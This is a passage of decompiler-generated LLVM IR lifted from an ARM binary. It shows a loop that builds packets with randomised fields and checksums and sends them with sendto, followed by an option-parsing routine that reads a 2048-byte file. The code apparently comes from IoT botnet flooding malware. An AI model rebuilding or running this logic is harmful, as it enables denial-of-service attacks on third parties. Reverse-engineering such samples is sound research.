  %v5_f430 = add i32 %v4_f430, %v2_f14c
  %v6_f430 = inttoptr i32 %v5_f430 to i32*
  %v7_f430 = load i32, i32* %v6_f430, align 4
  store i32 %v7_f430, i32* @r5, align 4
  %v7_f438 = icmp eq i8 %v3_f42c, 31
  store i1 %v7_f438, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* %r7.global-to-local, align 4
  %v1_f440 = add i32 %v7_f430, 20
  store i32 %v1_f440, i32* @r6, align 4
  %tmp61 = icmp ult i8 %v3_f42c, 32
  br i1 %tmp61, label %dec_label_pc_f528, label %dec_label_pc_f448

dec_label_pc_f448:                                ; preds = %dec_label_pc_f41c
  store i32 %v3_f274, i32* %r2.global-to-local, align 4
  store i1 %v3_f44c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f44c, label %dec_label_pc_f590, label %dec_label_pc_f454

dec_label_pc_f454:                                ; preds = %dec_label_pc_f528.dec_label_pc_f454_crit_edge, %dec_label_pc_f448
  %v1_f458 = phi i32 [ %v1_f458.pre, %dec_label_pc_f528.dec_label_pc_f454_crit_edge ], [ 65535, %dec_label_pc_f448 ]
  store i32 %v3_f278, i32* %r3.global-to-local, align 4
  %v9_f458 = icmp eq i32 %v3_f278, %v1_f458
  store i1 %v9_f458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f458, label %dec_label_pc_f5ac, label %dec_label_pc_f460

dec_label_pc_f460:                                ; preds = %dec_label_pc_f590.dec_label_pc_f460_crit_edge, %dec_label_pc_f454
  %v1_f464 = phi i32 [ %v1_f464.pre, %dec_label_pc_f590.dec_label_pc_f460_crit_edge ], [ %v1_f458, %dec_label_pc_f454 ]
  %v9_f464 = icmp eq i32 %v3_f27c, %v1_f464
  store i1 %v9_f464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f464, label %dec_label_pc_f5c8, label %dec_label_pc_f46c

dec_label_pc_f46c:                                ; preds = %dec_label_pc_f5ac, %dec_label_pc_f460, %dec_label_pc_f5c8
  %v0_f470 = load i32, i32* %r8.global-to-local, align 4
  %v1_f470 = trunc i32 %v0_f470 to i8
  %v2_f470 = load i32, i32* @r5, align 4
  %v3_f470 = add i32 %v2_f470, 10
  %v4_f470 = inttoptr i32 %v3_f470 to i8*
  store i8 %v1_f470, i8* %v4_f470, align 1
  %v0_f474 = load i32, i32* %r8.global-to-local, align 4
  %v1_f474 = trunc i32 %v0_f474 to i8
  %v2_f474 = load i32, i32* @r5, align 4
  %v3_f474 = add i32 %v2_f474, 11
  %v4_f474 = inttoptr i32 %v3_f474 to i8*
  store i8 %v1_f474, i8* %v4_f474, align 1
  %v0_f478 = load i32, i32* @r5, align 4
  store i32 %v0_f478, i32* @r0, align 4
  %v2_f47c = call i32 @function_fda0(i32 %v0_f478, i32 20)
  %v3_f47c = trunc i32 %v2_f47c to i8
  %v4_f480 = sdiv i32 %v2_f47c, 256
  store i32 %v4_f480, i32* %r3.global-to-local, align 4
  %v1_f484 = trunc i32 %v4_f480 to i8
  %v2_f484 = load i32, i32* @r5, align 4
  %v3_f484 = add i32 %v2_f484, 11
  %v4_f484 = inttoptr i32 %v3_f484 to i8*
  store i8 %v1_f484, i8* %v4_f484, align 1
  %v3_f488 = load i32, i32* @r5, align 4
  %v4_f488 = add i32 %v3_f488, 10
  %v5_f488 = inttoptr i32 %v4_f488 to i8*
  store i8 %v3_f47c, i8* %v5_f488, align 1
  %v0_f48c = load i32, i32* %r8.global-to-local, align 4
  %v1_f48c = trunc i32 %v0_f48c to i8
  %v2_f48c = load i32, i32* @r6, align 4
  %v3_f48c = add i32 %v2_f48c, 6
  %v4_f48c = inttoptr i32 %v3_f48c to i8*
  store i8 %v1_f48c, i8* %v4_f48c, align 1
  %v0_f490 = load i32, i32* %r8.global-to-local, align 4
  %v1_f490 = trunc i32 %v0_f490 to i8
  %v2_f490 = load i32, i32* @r6, align 4
  %v3_f490 = add i32 %v2_f490, 7
  %v4_f490 = inttoptr i32 %v3_f490 to i8*
  store i8 %v1_f490, i8* %v4_f490, align 1
  %v0_f494 = load i32, i32* @r5, align 4
  %v1_f494 = add i32 %v0_f494, 24
  %v2_f494 = inttoptr i32 %v1_f494 to i8*
  %v3_f494 = load i8, i8* %v2_f494, align 1
  %v4_f494 = zext i8 %v3_f494 to i32
  store i32 %v4_f494, i32* %r3.global-to-local, align 4
  %v1_f498 = add i32 %v0_f494, 25
  %v2_f498 = inttoptr i32 %v1_f498 to i8*
  %v3_f498 = load i8, i8* %v2_f498, align 1
  %v4_f498 = zext i8 %v3_f498 to i32
  %v4_f49c = mul nuw nsw i32 %v4_f498, 256
  %v5_f49c = or i32 %v4_f49c, %v4_f494
  store i32 %v5_f49c, i32* %r2.global-to-local, align 4
  %v3_f4a0 = load i32, i32* %stack_var_-44, align 4
  %v0_f4a4 = load i32, i32* @r6, align 4
  store i32 %v0_f4a4, i32* @r1, align 4
  %v1_f4a8 = add i32 %v3_f4a0, 12
  store i32 %v1_f4a8, i32* %r3.global-to-local, align 4
  %v4_f4b0 = call i32 @function_fdfc(i32 %v0_f494, i32 %v0_f4a4, i32 %v5_f49c, i32 %v1_f4a8)
  %v5_f4b0 = trunc i32 %v4_f4b0 to i8
  %v4_f4b424 = udiv i32 %v4_f4b0, 256
  %v1_f4b8 = trunc i32 %v4_f4b424 to i8
  %v2_f4b8 = load i32, i32* @r6, align 4
  %v3_f4b8 = add i32 %v2_f4b8, 7
  %v4_f4b8 = inttoptr i32 %v3_f4b8 to i8*
  store i8 %v1_f4b8, i8* %v4_f4b8, align 1
  %v3_f4bc = load i32, i32* @r6, align 4
  %v4_f4bc = add i32 %v3_f4bc, 6
  %v5_f4bc = inttoptr i32 %v4_f4bc to i8*
  store i8 %v5_f4b0, i8* %v5_f4bc, align 1
  %v3_f4c0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f4c0, i32* %r3.global-to-local, align 4
  %v0_f4c4 = load i32, i32* @r5, align 4
  %v1_f4c4 = add i32 %v0_f4c4, 20
  %v2_f4c4 = inttoptr i32 %v1_f4c4 to i32*
  %v3_f4c4 = load i32, i32* %v2_f4c4, align 4
  %v5_f4cc = mul i32 %v3_f4c0, 24
  %v1_f4d0 = load i32, i32* @sl, align 4
  %v2_f4d0 = add i32 %v1_f4d0, %v5_f4cc
  store i32 %v2_f4d0, i32* %ip.global-to-local, align 4
  %v3_f4d4 = udiv i32 %v3_f4c4, 65536
  store i32 %v3_f4d4, i32* %r2.global-to-local, align 4
  %v1_f4d8 = trunc i32 %v3_f4d4 to i8
  %v3_f4d8 = add i32 %v2_f4d0, 2
  %v4_f4d8 = inttoptr i32 %v3_f4d8 to i8*
  store i8 %v1_f4d8, i8* %v4_f4d8, align 1
  %v0_f4dc = load i32, i32* %r2.global-to-local, align 4
  %v3_f4dc25 = udiv i32 %v0_f4dc, 256
  %v3_f4e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f4e0, i32* %r2.global-to-local, align 4
  %v1_f4e4 = trunc i32 %v3_f4dc25 to i8
  %v2_f4e4 = load i32, i32* %ip.global-to-local, align 4
  %v3_f4e4 = add i32 %v2_f4e4, 3
  %v4_f4e4 = inttoptr i32 %v3_f4e4 to i8*
  store i8 %v1_f4e4, i8* %v4_f4e4, align 1
  %v0_f4e8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f4f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f4f0 = add i32 %v0_f4f0, 32
  store i32 %v1_f4f0, i32* %r2.global-to-local, align 4
  %v0_f4f4 = load i32, i32* %fp.global-to-local, align 4
  %v0_f4fc = load i32, i32* %ip.global-to-local, align 4
  %v6_f504 = call i32 @_sendto(i32 %v0_f4f4, i32 %v0_f4e8, i32 %v1_f4f0, i32 16384, i32 %v0_f4fc, i32 16)
  %v3_f508 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f508, i32* %r3.global-to-local, align 4
  %v1_f50c = add i32 %v3_f508, 1
  %v1_f510 = load i32, i32* %sb.global-to-local, align 4
  %v9_f510 = icmp eq i32 %v1_f50c, %v1_f510
  store i1 %v9_f510, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f50c, i32* %stack_var_-40, align 4
  %v5_f518 = icmp slt i32 %v1_f50c, %v1_f510
  br i1 %v5_f518, label %dec_label_pc_f41c, label %dec_label_pc_f51c

dec_label_pc_f51c:                                ; preds = %dec_label_pc_f46c
  %v2_f51c = icmp eq i32 %v1_f510, 0
  store i1 %v2_f51c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f40c.outer

dec_label_pc_f528:                                ; preds = %dec_label_pc_f41c
  %v1_f528 = add i32 %v2_f424, 16
  %v2_f528 = inttoptr i32 %v1_f528 to i32*
  %v3_f528 = load i32, i32* %v2_f528, align 4
  store i32 %v3_f528, i32* @r4, align 4
  %v0_f52c = call i32 @function_117dc()
  %v3_f530 = load i32, i32* %stack_var_-40, align 4
  %v5_f538 = mul i32 %v3_f530, 24
  %v0_f53c = load i32, i32* @r4, align 4
  %v1_f540 = and i32 %v0_f53c, 65280
  store i32 %v1_f540, i32* %r3.global-to-local, align 4
  %v1_f53c = udiv i32 %v0_f53c, 256
  %v3_f544 = and i32 %v1_f53c, 65280
  store i32 %v3_f544, i32* %r2.global-to-local, align 4
  %v1_f548 = load i32, i32* @sl, align 4
  %v2_f548 = add i32 %v1_f548, %v5_f538
  store i32 %v2_f548, i32* %ip.global-to-local, align 4
  %v1_f554 = add i32 %v2_f548, 20
  %v2_f554 = inttoptr i32 %v1_f554 to i8*
  %v3_f554 = load i8, i8* %v2_f554, align 1
  %v4_f554 = zext i8 %v3_f554 to i32
  store i32 %v4_f554, i32* %lr.global-to-local, align 4
  %v2_f55c = call i32 @llvm.bswap.i32(i32 %v0_f53c)
  %v7_f560 = lshr i32 %v0_f52c, %v4_f554
  %v8_f560 = add i32 %v7_f560, %v2_f55c
  store i32 %v3_f274, i32* %r2.global-to-local, align 4
  %v2_f580 = call i32 @llvm.bswap.i32(i32 %v8_f560)
  store i32 %v2_f580, i32* %r3.global-to-local, align 4
  %v1_f584 = load i32, i32* %r7.global-to-local, align 4
  %v9_f584 = icmp eq i32 %v3_f274, %v1_f584
  store i1 %v9_f584, i1* %cpsr_z.global-to-local, align 1
  %v1_f588 = load i32, i32* @r5, align 4
  %v2_f588 = add i32 %v1_f588, 16
  %v3_f588 = inttoptr i32 %v2_f588 to i32*
  store i32 %v2_f580, i32* %v3_f588, align 4
  br i1 %v9_f584, label %dec_label_pc_f590, label %dec_label_pc_f528.dec_label_pc_f454_crit_edge

dec_label_pc_f528.dec_label_pc_f454_crit_edge:    ; preds = %dec_label_pc_f528
  %v1_f458.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f454

dec_label_pc_f590:                                ; preds = %dec_label_pc_f528, %dec_label_pc_f448
  %v0_f590 = call i32 @function_117dc()
  %v1_f590 = trunc i32 %v0_f590 to i8
  %v4_f59426 = udiv i32 %v0_f590, 256
  %v1_f598 = trunc i32 %v4_f59426 to i8
  %v2_f598 = load i32, i32* @r5, align 4
  %v3_f598 = add i32 %v2_f598, 5
  %v4_f598 = inttoptr i32 %v3_f598 to i8*
  store i8 %v1_f598, i8* %v4_f598, align 1
  store i32 %v3_f278, i32* %r3.global-to-local, align 4
  %v1_f5a0 = load i32, i32* %r7.global-to-local, align 4
  %v9_f5a0 = icmp eq i32 %v3_f278, %v1_f5a0
  store i1 %v9_f5a0, i1* %cpsr_z.global-to-local, align 1
  %v3_f5a4 = load i32, i32* @r5, align 4
  %v4_f5a4 = add i32 %v3_f5a4, 4
  %v5_f5a4 = inttoptr i32 %v4_f5a4 to i8*
  store i8 %v1_f590, i8* %v5_f5a4, align 1
  %v0_f5a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f5a8, label %dec_label_pc_f5ac, label %dec_label_pc_f590.dec_label_pc_f460_crit_edge

dec_label_pc_f590.dec_label_pc_f460_crit_edge:    ; preds = %dec_label_pc_f590
  %v1_f464.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f460

dec_label_pc_f5ac:                                ; preds = %dec_label_pc_f590, %dec_label_pc_f454
  %v0_f5ac = call i32 @function_117dc()
  %v1_f5ac = trunc i32 %v0_f5ac to i8
  %v4_f5b4 = sdiv i32 %v0_f5ac, 256
  store i32 %v4_f5b4, i32* %r3.global-to-local, align 4
  %v1_f5b8 = load i32, i32* %r7.global-to-local, align 4
  %v9_f5b8 = icmp eq i32 %v3_f27c, %v1_f5b8
  store i1 %v9_f5b8, i1* %cpsr_z.global-to-local, align 1
  %v3_f5bc = load i32, i32* @r5, align 4
  %v4_f5bc = add i32 %v3_f5bc, 20
  %v5_f5bc = inttoptr i32 %v4_f5bc to i8*
  store i8 %v1_f5ac, i8* %v5_f5bc, align 1
  %v0_f5c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_f5c0 = trunc i32 %v0_f5c0 to i8
  %v2_f5c0 = load i32, i32* @r6, align 4
  %v3_f5c0 = add i32 %v2_f5c0, 1
  %v4_f5c0 = inttoptr i32 %v3_f5c0 to i8*
  store i8 %v1_f5c0, i8* %v4_f5c0, align 1
  %v0_f5c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f5c4, label %dec_label_pc_f5c8, label %dec_label_pc_f46c

dec_label_pc_f5c8:                                ; preds = %dec_label_pc_f5ac, %dec_label_pc_f460
  %v0_f5c8 = call i32 @function_117dc()
  %v1_f5c8 = trunc i32 %v0_f5c8 to i8
  %v4_f5cc = sdiv i32 %v0_f5c8, 256
  store i32 %v4_f5cc, i32* %r3.global-to-local, align 4
  %v1_f5d0 = trunc i32 %v4_f5cc to i8
  %v2_f5d0 = load i32, i32* @r6, align 4
  %v3_f5d0 = add i32 %v2_f5d0, 3
  %v4_f5d0 = inttoptr i32 %v3_f5d0 to i8*
  store i8 %v1_f5d0, i8* %v4_f5d0, align 1
  %v3_f5d4 = load i32, i32* @r6, align 4
  %v4_f5d4 = add i32 %v3_f5d4, 2
  %v5_f5d4 = inttoptr i32 %v4_f5d4 to i8*
  store i8 %v1_f5c8, i8* %v5_f5d4, align 1
  br label %dec_label_pc_f46c

dec_label_pc_f5dc:                                ; preds = %dec_label_pc_f23c
  %v0_f5dc = load i32, i32* %fp.global-to-local, align 4
  %v1_f5e0 = call i32 @_close(i32 %v0_f5dc)
  br label %dec_label_pc_f5e4

dec_label_pc_f5e4:                                ; preds = %dec_label_pc_f12c, %dec_label_pc_f5dc
  %v29_f5e8 = phi i32 [ %v3_f22c, %dec_label_pc_f12c ], [ %v1_f5e0, %dec_label_pc_f5dc ]
  store i32 %v3_f12c, i32* %r4.global-to-local, align 4
  store i32 %v6_f12c, i32* %r5.global-to-local, align 4
  store i32 %v9_f12c, i32* %r6.global-to-local, align 4
  store i32 %v12_f12c, i32* %r7.global-to-local, align 4
  ret i32 %v29_f5e8

; uselistorder directives
  uselistorder i32 %v4_f5cc, { 1, 0 }
  uselistorder i32 %v2_f580, { 1, 0 }
  uselistorder i32 %v0_f53c, { 1, 0, 2 }
  uselistorder i1 %v2_f51c, { 1, 0 }
  uselistorder i32 %v1_f510, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f50c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_f4d4, { 1, 0 }
  uselistorder i32 %v4_f480, { 1, 0 }
  uselistorder i1 %v3_f44c, { 1, 0 }
  uselistorder i32 %v1_f3f4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f398, { 1, 0 }
  uselistorder i32 %v1_f320, { 1, 0 }
  uselistorder i32 %v1_f2a8, { 1, 0 }
  uselistorder i32 %v1_f29c, { 1, 0 }
  uselistorder i32 %v0_f26c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_f264, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_f25c, { 1, 0 }
  uselistorder i1 %v7_f230, { 1, 0 }
  uselistorder i32 %v3_f22c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f1cc, { 1, 0 }
  uselistorder i8 %v5_f1bc, { 1, 0 }
  uselistorder i32 %v5_f1a0, { 1, 0 }
  uselistorder i32 %v6_f164, { 1, 0 }
  uselistorder i32 %v1_f130, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 12, 11 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 1, 4, 2, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 -8, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_f5e4, { 1, 0 }
  uselistorder label %dec_label_pc_f46c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f40c, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_f5f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f5f0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-2120 = alloca i32, align 4
  %v3_f5f0 = load i32, i32* @r4, align 4
  %v6_f5f0 = load i32, i32* @r5, align 4
  %v9_f5f0 = load i32, i32* @r6, align 4
  %v12_f5f0 = load i32, i32* @r7, align 4
  %v15_f5f0 = load i32, i32* @r8, align 4
  %v18_f5f0 = load i32, i32* @sb, align 4
  %v21_f5f0 = load i32, i32* @sl, align 4
  %v24_f5f0 = load i32, i32* @fp, align 4
  %v1_f5fc = urem i32 %arg1, 256
  store i32 %v1_f5fc, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_f608 = urem i32 %arg3, 256
  store i32 %v1_f608, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_f614 = call i32 @_calloc(i32 %v1_f5fc, i32 4)
  %v0_f618 = load i32, i32* @r5, align 4
  store i32 %v0_f618, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f624 = load i32, i32* @r4, align 4
  store i32 %v0_f624, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_f62c = inttoptr i32 %v0_f618 to i32*
  %v6_f62c = call i32 @function_b240(i32 %v0_f624, i32* %v5_f62c, i32 2, i32 0)
  %v1_f638 = urem i32 %v6_f62c, 256
  store i32 %v1_f638, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_f644 = load i32, i32* @r4, align 4
  store i32 %v0_f644, i32* %r0.global-to-local, align 4
  %v0_f648 = load i32, i32* @r5, align 4
  store i32 %v0_f648, i32* %r1.global-to-local, align 4
  %v5_f64c = trunc i32 %v6_f62c to i8
  %v6_f650 = inttoptr i32 %v0_f648 to i32*
  %v7_f650 = call i32 @function_b240(i32 %v0_f644, i32* %v6_f650, i32 3, i32 65535)
  %v0_f654 = load i32, i32* @r5, align 4
  store i32 %v0_f654, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_f660 = load i32, i32* @r4, align 4
  store i32 %v0_f660, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_f668 = inttoptr i32 %v0_f654 to i32*
  %v6_f668 = call i32 @function_b240(i32 %v0_f660, i32* %v5_f668, i32 4, i32 64)
  %v1_f670 = urem i32 %v6_f668, 256
  store i32 %v1_f670, i32* %ip.global-to-local, align 4
  %v0_f674 = load i32, i32* @r5, align 4
  store i32 %v0_f674, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f680 = load i32, i32* @r4, align 4
  store i32 %v0_f680, i32* %r0.global-to-local, align 4
  %v6_f688 = inttoptr i32 %v0_f674 to i32*
  %v7_f688 = call i32 @function_b240(i32 %v0_f680, i32* %v6_f688, i32 5, i32 0)
  %v1_f694 = urem i32 %v7_f688, 256
  store i32 %v1_f694, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_f6a0 = load i32, i32* @r4, align 4
  store i32 %v0_f6a0, i32* %r0.global-to-local, align 4
  %v0_f6a4 = load i32, i32* @r5, align 4
  store i32 %v0_f6a4, i32* %r1.global-to-local, align 4
  %v5_f6ac = inttoptr i32 %v0_f6a4 to i32*
  %v6_f6ac = call i32 @function_b240(i32 %v0_f6a0, i32* %v5_f6ac, i32 6, i32 65535)
  %v0_f6b0 = load i32, i32* @r5, align 4
  store i32 %v0_f6b0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  store i32 %v6_f6ac, i32* %fp.global-to-local, align 4
  %v0_f6c0 = load i32, i32* @r4, align 4
  store i32 %v0_f6c0, i32* %r0.global-to-local, align 4
  %v4_f6c4 = inttoptr i32 %v0_f6b0 to i32*
  %v5_f6c4 = call i32 @function_b240(i32 %v0_f6c0, i32* %v4_f6c4, i32 7, i32 53)
  %v0_f6cc = load i32, i32* @r5, align 4
  store i32 %v0_f6cc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v5_f6c4, i32* %sb.global-to-local, align 4
  %v0_f6dc = load i32, i32* @r4, align 4
  store i32 %v0_f6dc, i32* %r0.global-to-local, align 4
  %v4_f6e0 = inttoptr i32 %v0_f6cc to i32*
  %v5_f6e0 = call i32 @function_b240(i32 %v0_f6dc, i32* %v4_f6e0, i32 9, i32 65535)
  %v0_f6e4 = load i32, i32* @r5, align 4
  store i32 %v0_f6e4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 %v5_f6e0, i32* @sl, align 4
  %v0_f6f4 = load i32, i32* @r4, align 4
  store i32 %v0_f6f4, i32* %r0.global-to-local, align 4
  %v4_f6f8 = inttoptr i32 %v0_f6e4 to i32*
  %v5_f6f8 = call i32 @function_b240(i32 %v0_f6f4, i32* %v4_f6f8, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f704 = load i32, i32* @r5, align 4
  store i32 %v0_f704, i32* %r1.global-to-local, align 4
  store i32 %v5_f6f8, i32* %r8.global-to-local, align 4
  %v0_f70c = load i32, i32* @r4, align 4
  store i32 %v0_f70c, i32* %r0.global-to-local, align 4
  %v5_f710 = inttoptr i32 %v0_f704 to i32*
  %v6_f710 = call i32 @function_acdc(i32 %v0_f70c, i32* %v5_f710, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f71c = call i32 @function_13ce8(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_f728 = call i32 @function_13c04(i32 30, i32* null)
  store i32 %v3_f728, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_f730 = call i32 @_open(i32 %v3_f728, i32 0)
  store i32 %v2_f730, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f73c = call i32 @function_13c30(i32 30)
  store i32 %v1_f73c, i32* %r0.global-to-local, align 4
  %v0_f740 = load i32, i32* @r4, align 4
  %v1_f740 = icmp slt i32 %v0_f740, 0
  %v2_f740 = icmp eq i32 %v0_f740, 0
  store i1 %v2_f740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_f740, label %dec_label_pc_fd0c, label %dec_label_pc_f748

dec_label_pc_f748:                                ; preds = %dec_label_pc_f5f0
  %v2_f74c = ptrtoint i32* %stack_var_-2120 to i32
  store i32 %v2_f74c, i32* @r6, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_f74c, i32* %r1.global-to-local, align 4
  store i32 %v0_f740, i32* %r0.global-to-local, align 4
  %v3_f75c = call i32 @_read(i32 %v0_f740, i32 %v2_f74c, i32 2048)
  store i32 %v3_f75c, i32* @r5, align 4
  %v0_f764 = load i32, i32* @r4, align 4
  store i32 %v0_f764, i32* %r0.global-to-local, align 4
  %v1_f768 = call i32 @_close(i32 %v0_f764)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_f770 = call i32 @function_13ce8(i32 31)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_f77c = call i32 @function_13c04(i32 31, i32* null)
  %v0_f780 = load i32, i32* @r5, align 4
  store i32 %v0_f780, i32* @r1, align 4
  store i32 %v3_f77c, i32* %r2.global-to-local, align 4
  store i32 %v2_f74c, i32* %r0.global-to-local, align 4
  %v3_f78c = bitcast i32* %stack_var_-2120 to i8*
  %v4_f78c = call i32 @function_14960(i8* %v3_f78c, i32 %v0_f780, i32 %v3_f77c)
  store i32 %v4_f78c, i32* @r4, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_f798 = call i32 @function_13c30(i32 31)
  store i32 %v1_f798, i32* %r0.global-to-local, align 4
  %v0_f79c = load i32, i32* @r4, align 4
  %v7_f79c = icmp eq i32 %v0_f79c, -1
  store i1 %v7_f79c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f79c, label %dec_label_pc_fd0c, label %dec_label_pc_f7a4

dec_label_pc_f7a4:                                ; preds = %dec_label_pc_f748
  %v0_f7a4 = load i32, i32* @r5, align 4
  %v9_f7a4 = icmp eq i32 %v0_f7a4, %v0_f79c
  store i1 %v9_f7a4, i1* %cpsr_z.global-to-local, align 1
  %v7_f7a8 = icmp sgt i32 %v0_f7a4, %v0_f79c
  br i1 %v7_f7a8, label %dec_label_pc_f7ac, label %dec_label_pc_fd0c

dec_label_pc_f7ac:                                ; preds = %dec_label_pc_f7a4
  store i32 %v0_f7a4, i32* %r3.global-to-local, align 4
  store i32 %v0_f79c, i32* %r2.global-to-local, align 4
  %v0_f7bc = load i32, i32* @r6, align 4
  %v2_f7bc = add i32 %v0_f7bc, %v0_f79c
  store i32 %v2_f7bc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_f7c4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_f7c4, i32* %r7.global-to-local, align 4
  %v1_f7f4 = add i32 %v0_f7a4, -1
  br label %dec_label_pc_f7ec

dec_label_pc_f7d0:                                ; preds = %dec_label_pc_f814, %bb138
  %v9_f7d0 = icmp eq i32 %v0_f7dc, %v1_f7f4
  store i1 %v9_f7d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f7d0, label %dec_label_pc_f820, label %dec_label_pc_f7d8

dec_label_pc_f7d8:                                ; preds = %dec_label_pc_f804, %dec_label_pc_f7d0, %bb
  %v0_f81042 = phi i32 [ %v0_f810, %dec_label_pc_f804 ], [ %v0_f81043, %dec_label_pc_f7d0 ], [ %v0_f810, %bb ]
  %v0_f7f038 = phi i32 [ 0, %dec_label_pc_f804 ], [ %v0_f7f039, %dec_label_pc_f7d0 ], [ 0, %bb ]
  store i32 %v0_f7a4, i32* %r0.global-to-local, align 4
  %v1_f7dc = add i32 %v0_f7dc, 1
  store i32 %v1_f7dc, i32* %r2.global-to-local, align 4
  %v9_f7e0 = icmp eq i32 %v0_f7a4, %v1_f7dc
  store i1 %v9_f7e0, i1* %cpsr_z.global-to-local, align 1
  %v1_f7e4 = add i32 %v0_f7e4, 1
  store i32 %v1_f7e4, i32* %r7.global-to-local, align 4
  br i1 %v9_f7e0, label %dec_label_pc_fd0c, label %dec_label_pc_f7ec

dec_label_pc_f7ec:                                ; preds = %dec_label_pc_f7d8, %dec_label_pc_f7ac
  %v0_f7e4 = phi i32 [ %v1_f7e4, %dec_label_pc_f7d8 ], [ %v2_f7c4, %dec_label_pc_f7ac ]
